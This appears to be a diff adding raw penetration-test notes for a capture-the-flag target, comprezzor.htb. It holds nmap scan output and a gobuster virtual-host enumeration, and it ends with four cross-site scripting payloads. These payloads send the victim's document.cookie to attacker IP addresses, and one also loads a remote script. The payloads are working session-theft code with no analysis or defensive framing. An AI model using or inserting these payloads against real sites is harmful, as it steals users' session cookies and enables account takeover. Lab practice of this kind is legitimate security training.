@@ -1,0 +1,39 @@
+nmap:
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLS2jzf8Eqy8cVa20hyZcem8rwAzeRhrMNEGdSUcFmv1FiQsfR4F9vZYkmfKViGIS3uL3X/6sJjzGxT1F/uPm/U=
+|   256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFj9hE1zqO6TQ2JpjdgvMm6cr6s6eYsQKWlROV4G6q+4
+80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://comprezzor.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+gobuster found subdomains 
+gobuster vhost -u http://comprezzor.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --append-domain -t 10
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://comprezzor.htb/
+[+] Method:          GET
+[+] Threads:         10
+[+] Wordlist:        /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
+[+] User Agent:      gobuster/3.6
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: report.comprezzor.htb Status: 200 [Size: 3166]
+Found: auth.comprezzor.htb Status: 302 [Size: 199] [--> /login]
+Found: dashboard.comprezzor.htb Status: 302 [Size: 251] [--> http://auth.comprezzor.htb/login]
+
+<img src=x onerror=fetch('http://10.10.16.125:8000/'+document.cookie);>
+<script>var i=new Image(); i.src="http://10.10.14.46:8000?cookie=" + document.cookie;</script>
+<script>var i=new Image(); i.src="http://10.10.14.46:8000/test.js";</script>
+<img src=x onerror=fetch('http://10.10.16.125:4243/'+document.cookie);>
